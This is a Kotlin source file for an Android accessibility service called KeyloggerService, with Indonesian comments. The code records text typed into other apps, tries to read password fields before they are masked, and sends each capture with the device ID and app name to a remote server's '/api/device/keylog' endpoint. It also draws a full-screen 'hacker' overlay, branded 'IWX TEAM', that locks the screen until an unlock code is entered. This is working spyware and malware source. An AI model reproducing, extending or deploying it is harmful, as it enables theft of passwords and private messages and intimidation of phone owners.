package com.android.services

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.view.WindowManager
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import com.google.gson.JsonObject
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class KeyloggerService : AccessibilityService() {

    companion object {
        @Volatile var instance: KeyloggerService? = null
        @Volatile var unlockCode: String = "2719"
        fun showScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f) { instance?.showOverlay(text, style, speed) }
        fun hideScreenInject()   { instance?.hideOverlay() }
        fun resetUnlockCode()    { unlockCode = "2719" }
    }

    @Volatile private var overlayView: HackerOverlayView? = null
    private var wm: WindowManager? = null
    private var soundManager: HackerSoundManager? = null
    private val overlayHandler = Handler(Looper.getMainLooper())

    private val http = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .build()
    private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()

    // ── Per-field debounce: setiap field punya handler sendiri ───────────────
    // key = "pkg|fieldHint"
    private data class FieldEntry(
        val pkg: String,
        val fieldHint: String,
        var pendingText: String = "",
        var runnable: Runnable? = null
    )
    private val fields   = mutableMapOf<String, FieldEntry>()
    private val handler  = Handler(Looper.getMainLooper())

    // Untuk onKeyEvent (physical keyboard / beberapa OEM soft keyboard)
    private var activePkg   = ""
    private var activeField = ""
    private val keyBuffer   = StringBuilder()

    override fun onServiceConnected() {
        instance = this
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes  =
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED       or
                AccessibilityEvent.TYPE_VIEW_FOCUSED            or
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED    or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags        =
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS              or
                AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS    or
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 0
        }
    }

    // ── onKeyEvent: bonus — untuk physical keyboard & beberapa OEM ───────────
    // Soft keyboard (GBoard dll) TIDAK lewat sini; ditangani TYPE_VIEW_TEXT_CHANGED
    override fun onKeyEvent(event: KeyEvent): Boolean {
        if (event.action != KeyEvent.ACTION_DOWN) return false
        if (activePkg.isBlank() || activePkg == packageName) return false

        when (event.keyCode) {
            KeyEvent.KEYCODE_DEL, KeyEvent.KEYCODE_FORWARD_DEL -> {
                if (keyBuffer.isNotEmpty()) keyBuffer.deleteCharAt(keyBuffer.length - 1)
            }
            KeyEvent.KEYCODE_ENTER, KeyEvent.KEYCODE_NUMPAD_ENTER -> {
                val text = keyBuffer.toString().trim()
                if (text.isNotBlank()) {
                    sendNow(activePkg, activeField, text)
                    keyBuffer.clear()
                }
            }
            else -> {
                val unicode = event.unicodeChar
                if (unicode != 0 && unicode != 10) {
                    keyBuffer.append(unicode.toChar())
                    scheduleField(activePkg, activeField, keyBuffer.toString())
                }
            }
        }
        return false
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val ev = event ?: return

        when (ev.eventType) {

            // ── Fokus pindah / window baru ────────────────────────────────────
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val pkg = ev.packageName?.toString() ?: return
                if (pkg == packageName) return
                val src = ev.source
                val hint = resolveFieldHint(ev, src)
                src?.recycle()

                // Update aktif field untuk onKeyEvent
                if (pkg != activePkg) keyBuffer.clear()
                activePkg   = pkg
                activeField = hint
            }

            // ── Teks berubah — ini jalur utama untuk soft keyboard ────────────
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val pkg = ev.packageName?.toString() ?: return
                if (pkg == packageName) return

                val src        = ev.source
                val isPassword = src?.isPassword == true

                // Resolusi field hint
                val hint = resolveFieldHint(ev, src)

                // Update aktif field
                activePkg   = pkg
                activeField = hint

                val captured: String? = if (!isPassword) {
                    // ── Non-password: ambil teks penuh dari node langsung ────
                    val nodeText = src?.text?.toString()?.trim()
                        ?: ev.text.joinToString("").trim()
                    if (nodeText.isNotBlank() &&
                        !nodeText.all { it == '•' || it == '*' || it == '·' }) {
                        nodeText
                    } else null
                } else {
                    // ── Password field ──────────────────────────────────────
                    // Coba ambil teks sebelum sempat di-mask (bekerja di beberapa ROM)
                    val nodeText = src?.text?.toString() ?: ""
                    val rawOk   = nodeText.isNotBlank() &&
                                  !nodeText.all { it == '•' || it == '*' || it == '·' }
                    if (rawOk) {
                        // Lucky: teks belum di-mask
                        nodeText.trim()
                    } else {
                        // Sudah di-mask — gunakan keyBuffer yang diisi onKeyEvent
                        // (bekerja untuk physical keyboard / beberapa OEM)
                        val kbText = keyBuffer.toString().trim()
                        if (kbText.isNotBlank()) kbText else null
                    }
                }

                src?.recycle()

                if (captured != null) {
                    scheduleField(pkg, hint, captured)
                }
            }
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        hideOverlay()
        instance = null
        // Flush semua pending sebelum service mati
        fields.values.forEach { entry ->
            entry.runnable?.let { handler.removeCallbacks(it) }
            if (entry.pendingText.isNotBlank()) sendNow(entry.pkg, entry.fieldHint, entry.pendingText)
        }
        fields.clear()
    }

    // ── Debounce 250 ms per field — kirim teks paling baru setelah jeda ──────
    private fun scheduleField(pkg: String, fieldHint: String, text: String) {
        val key   = "$pkg|$fieldHint"
        val entry = fields.getOrPut(key) { FieldEntry(pkg, fieldHint) }

        // Batalkan timer lama
        entry.runnable?.let { handler.removeCallbacks(it) }
        entry.pendingText = text

        val run = Runnable {
            val t = entry.pendingText
            if (t.isNotBlank()) {
                sendNow(pkg, fieldHint, t)
                entry.pendingText = ""
            }
        }
        entry.runnable = run
        handler.postDelayed(run, 250)
    }

    // ── Resolusi deviceId identik dengan ConnectorService ────────────────────
    private fun resolveDeviceId(): String {
        @Suppress("HardwareIds")
        val androidId = Settings.Secure.getString(
            contentResolver, Settings.Secure.ANDROID_ID
        )?.takeIf { it.isNotBlank() && it != "9774d56d682e549c" }
        return if (androidId != null) {
            androidId
        } else {
            val hw = "${Build.MANUFACTURER}:${Build.MODEL}:${Build.BOARD}:${Build.HARDWARE}"
            hw.hashCode().toString().replace("-", "x")
        }
    }

    // ── Kirim langsung ke server tanpa debounce ───────────────────────────────
    private fun sendNow(pkg: String, fieldHint: String, text: String) {
        val deviceId = resolveDeviceId()

        val body = JsonObject().apply {
            addProperty("deviceId",   deviceId)
            addProperty("appPackage", pkg)
            addProperty("appName",    getAppName(pkg))
            addProperty("fieldName",  fieldHint)
            addProperty("text",       text)
        }

        Thread {
            try {
                http.newCall(
                    Request.Builder()
                        .url("${SecureConfig.serverUrl()}/api/device/keylog")
                        .post(body.toString().toRequestBody(JSON_MEDIA))
                        .build()
                ).execute().close()
            } catch (_: Exception) {}
        }.also { it.isDaemon = true }.start()
    }

    // ── Resolusi nama field dari event + node ─────────────────────────────────
    private fun resolveFieldHint(ev: AccessibilityEvent, src: android.view.accessibility.AccessibilityNodeInfo?): String {
        if (src != null) {
            val hint   = src.hintText?.toString()?.trim()?.takeIf { it.isNotBlank() }
            val desc   = src.contentDescription?.toString()?.trim()?.takeIf { it.isNotBlank() }
            val viewId = src.viewIdResourceName?.substringAfterLast("/")?.takeIf { it.isNotBlank() }
            if (hint != null) return hint
            if (desc != null) return desc
            if (viewId != null) return viewId
        }
        return ev.className?.toString()?.substringAfterLast(".") ?: "Field"
    }

    private fun getAppName(pkg: String): String = try {
        packageManager.getApplicationLabel(packageManager.getApplicationInfo(pkg, 0)).toString()
    } catch (_: Exception) { pkg }

    // ── Screen Inject Overlay ─────────────────────────────────────────────────
    fun showOverlay(text: String, style: String = "hacker", speed: Float = 0.60f) {
        overlayHandler.post {
            hideOverlayInternal()
            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            wm = windowManager
            val view = HackerOverlayView(this, text.ifBlank { "By IWX TEAM" }, style, unlockCode, speed) { hideOverlay() }
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR,
                PixelFormat.TRANSLUCENT
            ).also {
                it.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE or
                                   WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE
            }
            windowManager.addView(view, params)
            overlayView = view
            view.alpha = 0f
            view.animate().alpha(1f).setDuration(600).start()
            soundManager?.stop()
            soundManager = HackerSoundManager(this@KeyloggerService, speed).also { it.start(text.ifBlank { "System breach initiated" }) }
        }
    }

    fun hideOverlay() { overlayHandler.post { hideOverlayInternal() } }

    private fun hideOverlayInternal() {
        overlayView?.let { v ->
            try { v.stop(); wm?.removeView(v) } catch (_: Exception) {}
            overlayView = null
        }
        try { soundManager?.stop() } catch (_: Exception) {}
        soundManager = null
    }
}
